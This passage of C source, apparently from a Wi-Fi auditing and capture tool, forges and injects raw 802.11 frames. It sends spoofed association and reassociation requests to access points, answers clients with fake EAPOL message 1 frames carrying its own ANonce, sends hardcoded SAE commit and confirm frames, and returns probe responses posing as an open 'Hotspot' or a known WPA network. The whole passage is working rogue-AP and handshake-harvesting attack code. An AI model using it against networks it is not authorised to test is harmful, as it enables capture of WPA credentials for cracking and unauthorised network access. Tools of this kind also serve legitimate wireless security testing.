memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, zeiger->client, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, zeiger->ap, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa2data, REASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2b] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = AK_PSKSHA256;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA2_SIZE, "failed to transmit reassociationrequest");
return;
}
/*===========================================================================*/
static inline void send_reassociation_resp()
{
static mac_t *macftx;

static const uint8_t reassociationresponsedata[] =
{
/* Fixed parameters (6 bytes) Fixed parameters (6 bytes) */
0x11, 0x04,
0x00, 0x00,
0x01, 0xc0,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REASSOCIATIONRESPONSE_SIZE sizeof(reassociationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &reassociationresponsedata, REASSOCIATIONRESPONSE_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE, "failed to transmit associationresponse");
return;
}
/*===========================================================================*/
static inline void send_m1_wpa2()
{
static mac_t *macftx;
static const uint8_t llcdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e
};
static const uint8_t wpa2data[] =
{
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
};
#define WPA2_SIZE sizeof(wpa2data)

timestamp += 1;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +100);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
memcpy(macftx->addr1, &lastauthclient, 6);
memcpy(macftx->addr2, &lastauthap, 6);
memcpy(macftx->addr3, &lastauthap, 6);
macftx->from_ds = 1;
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &llcdata, LLC_SIZE);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE], &wpa2data, WPA2_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x0f] = (myrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x10] = myrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x11], &myanonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP)
		{
		packetlenown = HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99;
		writeepbown(fd_pcapng);
		}
	}
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99, "failed to transmit proberesponse");
lastauthtimestamp = timestamp;
return;
}
/*===========================================================================*/
static inline void send_m1_wpa1()
{
static mac_t *macftx;
static const uint8_t llcdata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e
};
static const uint8_t wpa1data[] =
{
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x89,
0x00, 0x20,
};
#define WPA1_SIZE sizeof(wpa1data)

timestamp += 1;
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +100);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_DATA;
memcpy(macftx->addr1, &lastauthclient, 6);
memcpy(macftx->addr2, &lastauthap, 6);
memcpy(macftx->addr3, &lastauthap, 6);
macftx->from_ds = 1;
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &llcdata, LLC_SIZE);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE], &wpa1data, WPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x0f] = (myrc >> 8) &0xff;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x10] = myrc &0xff;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +0x11], &myanonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP)
		{
		packetlenown = HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99;
		writeepbown(fd_pcapng);
		}
	}
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +99, "failed to transmit proberesponse");
lastauthtimestamp = timestamp;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2(macessidlist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = AK_PSKSHA256;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE, "failed to transmit associationrequest");
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa1(macessidlist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa1data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* WPA information (WPA1 AES) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1b] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x21] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x27] = AK_PSK;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA1_SIZE, "failed to transmit associationrequest");
return;
}
/*===========================================================================*/
static inline void send_association_resp()
{
static mac_t *macftx;
static const uint8_t associationresponsedata[] =
{
/* Fixed parameters (6 bytes) Fixed parameters (6 bytes) */
0x11, 0x04,
0x00, 0x00,
0x01, 0xc0,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE, "failed to transmit associationresponse");
return;
}
/*===========================================================================*/
/*===========================================================================*/
/*
static void send_null(uint8_t *ap)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_NULLFUNC;
macftx->to_ds = 1;
memcpy(macftx->addr1, ap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, ap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096) mydeauthenticationsequence = 1;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM, "failed to transmit null");
return;
}
*/
/*===========================================================================*/
/*===========================================================================*/
static inline void send_authentication_sae_confirm(uint8_t *macto, uint8_t *macfm)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x03, 0x00, 0x02, 0x00, 0x00, 0x00,
0x00, 0x00,
0xdf, 0xcf, 0x7e, 0x3f, 0x9e, 0xc0, 0x46, 0x68, 0x34, 0x9e, 0x76, 0x07, 0x08, 0x0f, 0xad, 0x78,
0x5a, 0xf8, 0xa4, 0x27, 0x20, 0x2b, 0xd8, 0x13, 0xc1, 0xd1, 0x34, 0x11, 0x54, 0x39, 0x3c, 0x76
};

#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macto, 6);
memcpy(macftx->addr2, macfm, 6);
memcpy(macftx->addr3, macfrx->addr3, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE, "failed to transmit sae confirm");
return;
}
/*===========================================================================*/
static inline void send_authentication_sae_commit(uint8_t *macto, uint8_t *macfm)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
0x13, 0x00,
0x3c, 0x01, 0xa7, 0xb8, 0x9a, 0x46, 0x31, 0x1b, 0xd6, 0x9c, 0x23, 0xef, 0x3a, 0xa5, 0xed, 0xb8,
0xed, 0xbe, 0x68, 0xf8, 0xc6, 0x57, 0x52, 0xa3, 0x6d, 0x8e, 0xe1, 0xee, 0x6e, 0x01, 0xef, 0x21,
0x43, 0xda, 0x71, 0x75, 0xe0, 0xe7, 0x43, 0x38, 0xa6, 0x33, 0xa1, 0x2c, 0xd3, 0x52, 0xcd, 0xbe,
0xd6, 0xd9, 0xc4, 0x19, 0x22, 0xdd, 0xb3, 0x3d, 0xd1, 0xaf, 0x85, 0xb0, 0x81, 0x7d, 0xdb, 0x8d,
0x5d, 0x73, 0xe2, 0x4e, 0x19, 0x24, 0x6b, 0x93, 0x4b, 0x2f, 0xff, 0x7f, 0x15, 0x42, 0x5f, 0x88,
0xe5, 0x56, 0xc8, 0x83, 0xa4, 0x82, 0x8a, 0xa3, 0x12, 0x73, 0x51, 0x02, 0xe9, 0x56, 0xaa, 0xa6
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macto, 6);
memcpy(macftx->addr2, macfm, 6);
memcpy(macftx->addr3, macfrx->addr3, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE, "failed to transmit sae commit");
return;
}
/*===========================================================================*/
static inline void send_authentication_resp_opensystem()
{
static mac_t *macftx;
static const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE, "failed to transmit authenticationresponse");
return;
}
/*===========================================================================*/
static inline void send_authentication_req_opensystem(uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, &mac_myclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE, "failed to transmit authenticationrequest");
return;
}
/*===========================================================================*/
static inline void send_probe_resp_open()
{
static mac_t *macftx;
static capap_t *capap;
const uint8_t proberesponsedata[] =
{
/* Tag: BC SSID Hotspot*/
0x00, 0x07, 0x48, 0x6f, 0x74, 0x73, 0x70, 0x6f, 0x74,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, &mac_myapopen, 6);
memcpy(macftx->addr3, &mac_myapopen, 6);
macftx->sequence = myapsequence++ << 4;
if(myapsequence >= 4096) myapsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = BEACONINTERVALL;
capap->capabilities = 0x401;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &proberesponsedata, PROBERESPONSE_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +0x15] = ptrfscanlist->channel;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +PROBERESPONSE_SIZE, "failed to transmit proberesponse");
return;
}
/*===========================================================================*/
static inline void send_probe_resp(uint8_t *client, macessidlist_t *zeigerap)
{
static mac_t *macftx;
static capap_t *capap;
static size_t rsnwpa_size;
const uint8_t proberesponse_head_data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
};
#define PROBERESPONSE_HEAD_SIZE sizeof(proberesponse_head_data)

const uint8_t proberesponse_ie_wpapsk[] =
{
/* Tag: RSN Information WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element WPA1 AES*/
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
